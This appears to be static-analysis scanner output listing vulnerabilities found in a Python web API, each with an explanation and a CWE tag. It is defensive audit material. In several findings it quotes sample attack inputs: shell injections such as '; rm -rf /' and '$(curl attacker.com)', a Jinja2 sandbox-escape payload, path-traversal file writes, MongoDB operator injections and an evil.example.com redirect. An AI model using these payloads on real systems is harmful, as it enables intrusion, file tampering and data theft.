extra.message: The `host` query parameter is concatenated directly into a shell command string passed to `os.system()` without sanitization. An attacker can inject shell metacharacters (e.g. `; rm -rf /` or `$(curl attacker.com)`) via the `host` parameter to execute arbitrary OS commands.

User-controlled `fragment` query parameter is concatenated into a Jinja2 `Template()` string and rendered. This allows Server-Side Template Injection (SSTI), which can lead to remote code execution via Jinja2 sandbox-escape payloads (e.g. `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`).

The `filter` field of the JSON request body is passed directly as the MongoDB query document to `find_one()` without validation. An attacker can inject MongoDB operators (e.g. `{"$where": "..."}`, `{"$ne": null}`) to bypass query intent, extract unauthorized data, or cause a denial of service via expensive `$where` JavaScript execution.

cwe: CWE-943: Improper Neutralization of Special Elements in Data Query Logic

extra.message: The `endpoint` query parameter is passed unvalidated to `urllib.request.urlopen()`, and the response body is reflected back to the caller. This is a classic SSRF allowing an attacker to make the server issue requests to internal/private network hosts (e.g. cloud metadata endpoints, internal admin panels) and read the responses.

The `ref` value (from query string or JSON body) is interpolated directly into a filename (`f"{ref}.json"`) under `BASE_EXPORT_DIR` with no sanitization of path separators or `..` sequences. An attacker can supply `ref=../../etc/cron.d/evil` (or similar) to write an arbitrary file outside the intended export directory. The endpoint also persists hardcoded-looking SSN/card fallback values to disk.

The `name` query parameter is used verbatim to build the destination path (`BASE_EXPORT_DIR / name`) for writing the raw request body to disk, with no filename sanitization or containment check. An attacker can pass `name=../../../../tmp/evil.sh` (or an absolute path) to write arbitrary files outside `BASE_EXPORT_DIR`.

Elevated access (`lane: elevated`, exposing `payroll: full`) is granted based solely on a static, hardcoded string value (`"lead"`) supplied via a client-controlled cookie or header (`ops_badge` / `x-ops-badge`), with no cryptographic signature or server-side verification. Any caller who passes the gate can trivially set this cookie/header to escalate privileges and access payroll data.

The `copyline` query parameter is concatenated directly into an HTML response body and returned via `HTMLResponse` without any escaping. An attacker can inject `<script>` or other HTML/JS to achieve reflected Cross-Site Scripting against anyone who follows a crafted link.

The entire client-supplied JSON body (`change_set`) is merged (`.update()`) directly onto a workspace object that includes sensitive/privileged fields (`is_admin`, `role`, `credit_limit`) with no allow-list or validation. A caller can pass `{"is_admin": true, "role": "admin"}` to overwrite privileged fields — a classic mass-assignment vulnerability.

cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: The endpoint returns a hardcoded-looking SSN-shaped value (`tax_ref`) and a live-looking partner sync token (`sync_key`) in a plain JSON response with no data masking. This pattern exposes sensitive PII/secrets to any caller who can pass the (weak) ops gate.

cwe: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

extra.message: The `lane` query parameter is passed unvalidated to `RedirectResponse()`. An attacker can craft a link with `lane=https://evil.example.com` to redirect authenticated users to an attacker-controlled site (phishing / token leakage via Referer).

cwe: CWE-601: URL Redirection to Untrusted Site (Open Redirect)

extra.message: The full raw request body and the `Authorization` header (which may carry a bearer token/credential) are written to the application log at WARNING level. Logs are frequently retained, aggregated, and accessed more broadly than the API itself, so this leaks credentials and potentially sensitive request content.

cwe: CWE-532: Insertion of Sensitive Information into Log File

extra.message: The `Origin` request header is reflected verbatim into `Access-Control-Allow-Origin` while `Access-Control-Allow-Credentials` is set to `true`. This effectively allows any origin to make credentialed cross-origin requests (with cookies) against this endpoint, defeating the same-origin policy and enabling cross-site data theft/CSRF-style attacks against authenticated sessions.

cwe: CWE-942: Permissive Cross-domain Policy with Untrusted Domains

extra.message: An unverified SSL context (`ssl._create_unverified_context()`) is used to make an outbound HTTPS request, disabling both certificate validation and hostname verification. This exposes the request to man-in-the-middle attacks.

The `count` query parameter has no upper bound validation and is used directly to build an in-memory list. A caller can pass an arbitrarily large `count` (e.g. billions) to exhaust server memory/CPU, causing a denial of service.
The endpoint exposes the internal `APP_ENV` environment variable value and the internal export storage path to the caller, leaking internal configuration/deployment details that aid further attacks.

cwe: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

extra.message: `secret_key` (used to sign JWT session tokens via HMAC-SHA256) has a hardcoded, publicly-visible default value that is used whenever the `SECRET_KEY` environment variable is not set. If deployed without overriding this value, an attacker who reads the source can forge valid session tokens for any user/role. The `database_url` default on line 24 likewise embeds hardcoded default DB credentials.
